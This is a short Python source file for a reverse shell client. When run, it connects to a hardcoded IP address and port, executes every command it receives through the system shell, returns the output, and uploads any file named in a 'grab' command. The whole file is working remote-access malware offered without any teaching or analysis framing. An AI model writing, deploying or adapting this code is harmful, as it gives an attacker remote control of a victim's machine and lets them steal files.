import os
from socket import socket
from subprocess import Popen, PIPE


class SocketHandler:
    def __init__(self, ip_address: str, port: int):
        self.socket = socket()
        self.socket.connect((ip_address, port))

    def _send_command_output(self, stdout, stderr):
        if not stdout and not stderr:
            self.socket.send(b"Command Executed")
            return
        self.socket.send(stdout)
        self.socket.send(stderr)

    def execute_command(self, command):
        stdout, stderr = Popen(
            command,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE,
        ).communicate()

        self._send_command_output(stdout, stderr)

    def receive(self, size=1024):
        return self.socket.recv(size).decode()

    def terminate(self):
        self.close()

    def transfert(self, path: str):
        if os.path.exists(path):
            with open(path, 'rb') as f:
                packet = f.read(1024)
                while len(packet) > 0:
                    self.socket.send(packet)
                    packet = f.read(1024)
                self.socket.send(b'0x0F0E0D0C0B0A')
        else:
            self.socket.send(b'File not found')



def main():
    socket_handler = SocketHandler(ip_address="192.168.68.117", port=8081)

    while True:
        command = socket_handler.receive()
        if 'terminate' in command:
            socket_handler.terminate()
            break
        elif 'grab' in command:
            grab, path = command.split(':')
            socket_handler.transfert(path=path)
        else:
            socket_handler.execute_command(command)
        


if __name__ == '__main__':
    main()
